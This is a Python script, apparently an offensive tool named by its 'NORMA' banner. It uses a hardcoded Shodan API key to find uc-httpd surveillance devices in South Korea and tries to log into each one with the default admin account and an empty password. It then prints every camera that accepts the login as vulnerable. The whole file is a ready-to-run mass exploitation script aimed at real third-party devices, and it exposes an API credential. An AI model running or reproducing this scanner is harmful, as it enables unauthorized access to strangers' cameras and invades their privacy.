import shodan
from colorama import Fore
import requests
from bs4 import BeautifulSoup


banner = """       

   _   _  ___  ____  __  __    _ 
  | \ | |/ _ \|  _ \|  \/  |  / \      
  |  \| | | | | |_) | |\/| | / _ \    
  | |\  | |_| |  _ <| |  | |/ ___ \   
  |_| \_|\___/|_| \_\_|  |_/_/   \_\   


"""
 
SHODAN_API_KEY = 'GKja8yvDZh5B1gDF6jhz64hTJkPtOCUV' 
 
query='uc-httpd country:KR'
data=(('command','login'),('username','admin'),('password',''))
def shodan_query(i):
    try:
        api = shodan.Shodan(SHODAN_API_KEY)
        result = api.search(query, page=i) #You can modify the page
    except shodan.APIError as e:
        print (Fore.RED + e.value + Fore.RESET)
        return False
 
    #if len(result['matches']) > 0:
        #print ('Found ' + str(result['total']) + " results")
 
    #else:
        #print ("Nothing was found")
        #return False
 
    return result
 
def query_print(result):
    for service in result['matches']: 
        try:
            login_url='http://'+service['ip_str']+':'+str(service['port'])+'//Login.htm'
            print "Default Account Access Trying ===> "+login_url
            resp=requests.post(login_url,data=data, timeout=4) 
            soup=BeautifulSoup(resp.text,'lxml')
            if soup.title.text == "NetSurveillance": 
                print ("------------Vulnerable-------------")
                print ("IP : "+ Fore.RED+ "http://" + service['ip_str']+':'+ str(service['port']) + Fore.RESET)
                print ("-----------------------------------")
        except KeyboardInterrupt:
            raise
        except:
            pass
    
if __name__=="__main__":
	print banner
	for i in range(1,10):
		results=shodan_query(i)
		query_print(results)
